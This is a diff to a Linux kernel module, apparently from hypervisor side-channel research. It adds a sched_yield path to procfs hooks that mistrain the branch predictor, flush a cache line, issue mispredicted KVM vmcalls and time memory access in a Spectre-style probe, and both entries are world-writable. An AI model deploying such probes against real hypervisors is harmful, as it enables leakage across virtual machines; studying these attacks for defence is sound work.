@@ -7,13 +7,12 @@
 
 #include <linux/kvm_para.h>
 
-#include "cache_eviction.h"
 #include "hypercall.h"
-#include "linux/gfp_types.h"
 #include "timing.h"
 
 static struct proc_dir_entry *proc_root;
 static struct proc_dir_entry *proc_send_ipi;
+static struct proc_dir_entry *proc_sched_yield;
 
 static inline __attribute__((always_inline)) void disable_smap(void) { __asm__ volatile("stac" ::: "cc"); }
 static inline __attribute__((always_inline)) void enable_smap(void) { __asm__ volatile("clac" ::: "cc"); }
@@ -29,8 +28,13 @@ static inline __attribute__((always_inline)) void confuse_branch_predictor(void)
                    : "rcx", "cc");
 }
 
-static noinline void vmcall(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
-                            unsigned long rsi) {
+static noinline void vmcall1(int hypercall_number, unsigned long rbx) {
+  confuse_branch_predictor();
+  asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx));
+}
+
+static noinline void vmcall4(int hypercall_number, unsigned long rbx, unsigned long rcx, unsigned long rdx,
+                             unsigned long rsi) {
   confuse_branch_predictor();
   asm volatile("vmcall" : "+a"(hypercall_number), "+b"(rbx), "+c"(rcx), "+d"(rdx), "+S"(rsi));
 }
@@ -61,16 +65,47 @@ static ssize_t send_ipi_write(struct file *file, const char __user *buff, size_t
   //                      not             not          not
   //                     taken           taken        taken
   //
-  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
-  vmcall(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
+  vmcall4(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
+  vmcall4(type, opts.real.mask_low, opts.real.mask_high, opts.real.min, opts.real.icr.raw_icr);
 
   // Do the mispredicted vmcall!
   disable_smap();
   __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
   enable_smap();
 
-  vmcall(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
-         opts.mispredicted.icr.raw_icr);
+  vmcall4(type, opts.mispredicted.mask_low, opts.mispredicted.mask_high, opts.mispredicted.min,
+          opts.mispredicted.icr.raw_icr);
+
+  disable_smap();
+  size_t time = access_time(opts.ptr);
+  enable_smap();
+
+  return time;
+}
+
+static ssize_t sched_yield_write(struct file *file, const char __user *buff, size_t len, loff_t *off) {
+  struct sched_yield_hypercall opts;
+
+  // Make sure that only the size of the struct is written
+  if (len != sizeof(opts)) {
+    return -EINVAL;
+  }
+
+  // Copy the buffer from the user
+  if (copy_from_user(&opts, buff, sizeof(opts))) {
+    return -EFAULT;
+  }
+
+  int type = KVM_HC_SCHED_YIELD;
+  vmcall1(type, opts.current_cpu_id);
+  vmcall1(type, opts.current_cpu_id);
+
+  // Do the mispredicted vmcall!
+  disable_smap();
+  __asm__ volatile("clflush (%0)\nmfence" ::"r"(opts.ptr));
+  enable_smap();
+
+  vmcall1(type, opts.speculated_cpu_id);
 
   disable_smap();
   size_t time = access_time(opts.ptr);
@@ -83,9 +118,14 @@ static const struct proc_ops send_ipi_fops = {
     .proc_write = send_ipi_write,
 };
 
+static const struct proc_ops sched_yield_fops = {
+    .proc_write = sched_yield_write,
+};
+
 static int __init hypercall_main(void) {
   const char *procfs_root_name = "hypercall";
   const char *procfs_ipi_name = "send_ipi";
+  const char *procfs_sched_yield_name = "sched_yield";
 
   // Initialize the root procfs entry
   proc_root = proc_mkdir(procfs_root_name, NULL);
@@ -104,12 +144,24 @@ static int __init hypercall_main(void) {
     return -ENOMEM;
   }
 
+  // Initialize the sched_yield entry
+  proc_sched_yield = proc_create(procfs_sched_yield_name, 0666, proc_root, &sched_yield_fops);
+  if (!proc_sched_yield) {
+    proc_remove(proc_sched_yield);
+    proc_remove(proc_send_ipi);
+    proc_remove(proc_root);
+    pr_alert("hypercall: Error:Could not initialize /proc/%s/%s\n", procfs_root_name,
+             procfs_sched_yield_name);
+    return -ENOMEM;
+  }
+
   pr_info("hypercall: procfs entries created\n");
 
   return 0;
 }
 
 static void __exit hypercall_exit(void) {
+  proc_remove(proc_sched_yield);
   proc_remove(proc_send_ipi);
   proc_remove(proc_root);
   pr_info("hypercall: procfs entries removed\n");
